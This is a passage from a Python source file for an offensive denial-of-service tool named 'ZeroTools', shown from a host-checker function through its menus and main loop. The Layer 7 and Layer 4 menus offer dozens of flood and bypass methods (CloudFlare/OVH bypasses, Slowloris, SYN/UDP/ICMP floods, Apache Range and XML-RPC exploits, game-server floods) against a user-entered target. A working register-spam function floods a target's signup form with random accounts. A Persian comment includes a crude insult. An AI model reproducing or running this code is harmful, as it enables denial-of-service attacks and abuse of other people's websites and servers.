        except requests.exceptions.ConnectionError as e:
            return False, None, None, f"ConnectionError: {e}", None
        except requests.exceptions.RequestException as e:
            return False, None, None, f"RequestException: {e}", None

    def normalize_url(u):
        u = u.strip()
        if u.startswith("http://") or u.startswith("https://"):
            return u
        return "http://" + u

    try:
        user_input = input(G + "Enter IP or URL " + G + "$ " + G).strip()
    except:
        return

    if not user_input:
        return

    url = normalize_url(user_input)
    parsed = urlparse(url)
    host = parsed.hostname
    ip = get_ip(host)
    if not ip:
        print(R + f"Could not resolve IP for {host}")
        return

    ip_num = ip_to_number(ip)
    ip_num_str = str(ip_num) if ip_num is not None else "-"
    tcp_port = parsed.port if parsed.port else (443 if parsed.scheme == "https" else 80)
    udp_port = 53

    print(G + f"Starting checks for {user_input}" + RESET)
    attempt = 0

    while True:
        attempt += 1
        ok_http, code, reason, error, lat_http = http_check(url)
        ok_tcp, lat_tcp = tcp_port_check(ip, tcp_port)
        ok_udp = udp_port_check(ip, udp_port)

        conn_status = G + "ok" + RESET if ok_http else R + "error" + RESET
        if not ok_http:
            if error:
                error_msg = error
            elif code:
                error_msg = f"{code} {reason}"
            else:
                error_msg = "-"
        else:
            error_msg = "-"

        print(f"""
{Y}Attempt: {attempt}{RESET}
ip : {ip}
url : {url}
number ip : {ip_num_str}
ping: {f'{lat_http:.1f} ms' if lat_http else '-'}
connection: {conn_status}
error: {error_msg}
port tcp : {tcp_port} ({G + 'open' if ok_tcp else R + 'closed'}{RESET})
port udp : {udp_port} ({G + 'open or filtered' if ok_udp else R + 'closed'}{RESET})
----------------------------
""")
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print(Y + "\nInterrupted. Exiting CheckHost...")
            break

def l7_menu():
    clear()
    print(G + """
    ╔══════════════════════════════════════════════════════════════════════════════════════════╗
    ║                                  L A Y E R  7                                            ║
    ╠══════════════════════════════════════════════════════════════════════════════════════════╣
    ║  get         GET Flood                                                                   ║
    ║  post        POST Flood                                                                  ║
    ║  head        HEAD Flood                                                                  ║
    ║  cfb         CloudFlare Bypass   (old)                                                   ║
    ║  pxcfb       [PROXY-http] CloudFlare Bypass with Proxy   (old)                           ║
    ║  ovh         Bypass OVH   (old)                                                          ║
    ║  rhexx       Random HEX   (old)                                                          ║
    ║  stomp       Bypass chk_captcha                                                          ║
    ║  stress      Send HTTP Packet With High Byte                                             ║
    ║  dyn         Random SubDomain           (old)                                            ║
    ║  downloader  Slow Read Data   (old)                                                      ║
    ║  slow        Slowloris       (very old why you want use this?)                           ║
    ║  null        Null UserAgent                                                              ║
    ║  cookie      Random Cookie PHP                                                           ║
    ║  pps         Only GET / HTTP/1.1      (old) (not work)                                   ║
    ║  even        GET with more headers                                                       ║
    ║  bot         Googlebot simulation                                                        ║
    ║  apache      Apache Range Exploit                                                        ║
    ║  xmlrpc      WP XML-RPC exploit                                                          ║
    ║  bomb        Bombardier        (old)                                                     ║
    ║  killer      Multi-thread Killer    (old)                                                ║
    ║  http2       HTTP/2 Request          (old)                                               ║
    ║  pxhttp2     [PROXY-http] HTTP/2 with Proxy        (old)                                 ║
    ║  soc         Socket Attack                                                               ║
    ║  pxsoc       [PROXY-http] Proxy Socket Attack                                            ║
    ║  spoof       Spoofed HTTP Socket            (old)                                        ║
    ║  pxspoof     [PROXY-socks5] Proxy Spoofed HTTP Socket   (old)                            ║
    ║  pxraw       [PROXY-http] Proxy GET Request      (old)                                   ║
    ║  bypass      Simple CF Bypass                    (old)                                   ║
    ║  normal      Normal DDoS                 (old)                                           ║
    ║  test        Test Attack              (old)                                              ║
    ║  advanced    Advanced Mixed Attack     (old but good)                                    ║
    ║  browser     Browser Simulation        (old but good)                                    ║
    ║  back        Return to main menu                                                         ║
    ╚══════════════════════════════════════════════════════════════════════════════════════════╝
    Proxy file: ./proxy.txt (one ip:port per line, type depends on method: http or socks5)
    """)

    method = input(G + "ZeroTools/L7 " + G + "$ " + G).strip().lower()

    if method == "back":
        return

    valid_methods = (
        "get", "post", "head", "cfb", "pxcfb", "ovh", "rhexx", "stomp", "stress",
        "dyn", "downloader", "slow", "null", "cookie", "pps", "even", "bot",
        "apache", "xmlrpc", "bomb", "killer", "http2", "pxhttp2", "soc", "pxsoc",
        "spoof", "pxspoof", "pxraw", "bypass", "normal", "test", "advanced", "browser"
    )
    if method not in valid_methods:
        print(R + "Unknown method. Type 'back' to return.")
        return

    url = input(getattr + "Target URL " + G + "$ " + G).strip()
    try:
        th = int(input(G + "Threads " + G + "$ " + G) or "500")
    except:
        th = 500
    try:
        t = int(input(G + "Time (sec) " + G + "$ " + G) or "60")
    except:
        t = 60

    timer = threading.Thread(target=countdown, args=(t,))
    timer.start()

    if method == "get":
        LaunchRAW(url, th, t)
    elif method == "post":
        LaunchPOST(url, th, t)
    elif method == "head":
        LaunchHEAD(url, th, t)
    elif method == "cfb":
        LaunchCFB(url, th, t)
    elif method == "pxcfb":
        LaunchPXCFB(url, th, t)
    elif method == "ovh":
        LaunchOVH(url, th, t)
    elif method == "rhexx":
        LaunchRHEX(url, th, t)
    elif method == "stomp":
        LaunchSTOMP(url, th, t)
    elif method == "stress":
        LaunchSTRESS(url, th, t)
    elif method == "dyn":
        LaunchDYN(url, th, t)
    elif method == "downloader":
        LaunchDOWNLOADER(url, th, t)
    elif method == "slow":
        LaunchSLOW(url, th, t)
    elif method == "null":
        LaunchNULL(url, th, t)
    elif method == "cookie":
        LaunchCOOKIE(url, th, t)
    elif method == "pps":
        LaunchPPS(url, th, t)
    elif method == "even":
        LaunchEVEN(url, th, t)
    elif method == "bot":
        LaunchBOT(url, th, t)
    elif method == "apache":
        LaunchAPACHE(url, th, t)
    elif method == "xmlrpc":
        LaunchXMLRPC(url, th, t)
    elif method == "bomb":
        LaunchBOMB(url, th, t)
    elif method == "killer":
        LaunchKILLER(url, th, t)
    elif method == "http2":
        LaunchHTTP2(url, th, t)
    elif method == "pxhttp2":
        LaunchPXHTTP2(url, th, t)
    elif method == "soc":
        LaunchSOC(url, th, t)
    elif method == "pxsoc":
        LaunchPXSOC(url, th, t)
    elif method == "spoof":
        LaunchSPOOF(url, th, t)
    elif method == "pxspoof":
        LaunchPXSPOOF(url, th, t)
    elif method == "pxraw":
        LaunchPXRAW(url, th, t)
    elif method == "bypass":
        launch_bypass(url, th, t)
    elif method == "normal":
        ddos_normal(url, th)
    elif method == "test":
        ddos_test(url, th)
    elif method == "advanced":
        ddos_advanced(url, th)
    elif method == "browser":
        browser_method(url, th, t)

    timer.join()

def l4_menu():
    clear()
    print(G + """
    ╔══════════════════════════════════════════════════════════════════════════╗
    ║                         L A Y E R  4                                     ║
    ╠══════════════════════════════════════════════════════════════════════════╣
    ║  udp        UDP Flood Bypass    (old)                                    ║
    ║  tcp        TCP Flood Bypass     (old)                                   ║
    ║  syn        SYN Flood             (old)                                  ║
    ║  ovh-udp    UDP flood with HTTP headers to bypass OVH and WAFs           ║
    ║  icmp       Icmp echo request flood (Layer3)                             ║
    ║  cps        Open and close connections with proxy    (old)               ║
    ║  connection Open connection alive with proxy                             ║
    ║  vse        Send Valve Source Engine Protocol                            ║
    ║  ts3        Send Teamspeak 3 Status Ping Protocol                        ║
    ║  fivem      Send FiveM Status Ping Protocol                              ║
    ║  fivem-token Send FiveM confirmation token flood                         ║
    ║  minecraft  Minecraft Status Ping Protocol                               ║
    ║  mcpe       Minecraft PE Status Ping Protocol                            ║
    ║  back       Return to main menu                                          ║
    ╚══════════════════════════════════════════════════════════════════════════╝
    """)

    method = input(G + "ZeroTool/L4 " + G + "$ " + G).strip().lower()

    if method == "back":
        return

    valid_methods = (
        "udp", "tcp", "syn", "ovh-udp", "icmp", "cps", "connection",
        "vse", "ts3", "fivem", "fivem-token", "minecraft", "mcpe"
    )
    if method not in valid_methods:
        print(R + "Unknown method. Type 'back' to return.")
        return

    host = input(G + "Target IP " + G + "$ " + G).strip()

    if method in ("icmp", "cps", "connection"):
        port = 80
    else:
        port = int(input(G + "Port " + G + "$ " + G) or "80")

    try:
        th = int(input(G + "Threads " + G + "$ " + G) or "500")
    except:
        th = 500
    try:
        t = int(input(G + "Time (sec) " + G + "$ " + G) or "60")
    except:
        t = 60

    timer = threading.Thread(target=countdown, args=(t,))
    timer.start()

    if method == "udp":
        run_udp_flood(host, port, th, t)
    elif method == "tcp":
        run_tcp_flood(host, port, th, t)
    elif method == "syn":
        LaunchSYN(host, port, th, t)
    elif method == "ovh-udp":
        LaunchOVHUDP(host, port, th, t)
    elif method == "icmp":
        LaunchICMP(host, th, t)
    elif method == "cps":
        LaunchCPS(host, port, th, t)
    elif method == "connection":
        LaunchCONNECTION(host, port, th, t)
    elif method == "vse":
        LaunchVSE(host, port, th, t)
    elif method == "ts3":
        LaunchTS3(host, port, th, t)
    elif method == "fivem":
        LaunchFIVEM(host, port, th, t)
    elif method == "fivem-token":
        LaunchFIVEMTOKEN(host, port, th, t)
    elif method == "minecraft":
        LaunchMINECRAFT(host, port, th, t)
    elif method == "mcpe":
        LaunchMCPE(host, port, th, t)

    timer.join()

def spam_register():
    clear()
    print(G + """
    ╔══════════════════════════════════════════╗
    ║        Register Spammer (Maintenance)    ║
    ╚══════════════════════════════════════════╝
    """)
    target_url = input(G + "Target register URL " + G + "$ " + G).strip()
    if not target_url:
        target_url = () # درست نشده عزیزم چیو میخوای ببینی؟ 

    try:
        threads_count = int(input(G + "Threads " + G + "$ " + G) or "10")
    except:
        threads_count = 10

    print(Y + f"Starting infinite register spam on {target_url} with {threads_count} threads. Press Ctrl+C to stop.\n")

    def random_string(length):
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return ''.join(random.choice(chars) for _ in range(length))

    def spammer():
        while True:
            username = random_string(10)
            password = random_string(15)
            data = f"username={username}&password={password}&password_confirm={password}"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": target_url,
            }
            try:
                resp = requests.post(target_url, data=data, headers=headers, timeout=10)
            except:
                pass

    for _ in range(threads_count):
        threading.Thread(target=spammer, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Y + "\nRegister spam stopped.")

def main():
    banner()
    show_commands()
    while True:
        cmd = input(G + "ZeroTools " + G + "$ " + G).strip().lower()

        if cmd in ("exit", "quit"):
            print(G + "Goodbye!")
            break

        elif cmd in ("l7", "layer7"):
            while True:
                l7_menu()
                again = input(G + "\nAnother L7 attack? (y/n) " + G + "$ " + G).lower()
                if again != "y":
                    break
            clear()
            banner()
            show_commands()

        elif cmd in ("l4", "layer4"):
            while True:
                l4_menu()
                again = input(G + "\nAnother L4 attack? (y/n) " + G + "$ " + G).lower()
                if again != "y":
                    break
            clear()
            banner()
            show_commands()

        elif cmd in ("check", "host", "checkhost"):
            check_host()
            input(Y + "\nPress Enter to continue...")
            clear()
            banner()
            show_commands()

        elif cmd == "spamreg":
            spam_register()
            clear()
            banner()
            show_commands()

        elif cmd in ("clear", "cls"):
            clear()
            banner()
            show_commands()

        else:
            print(R + "Unknown command. Available: l7, l4, check, spamreg, clear, exit")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Y + "\nGoodbye!")
        sys.exit(0)

        # دست بزنی کونی هستی :))))
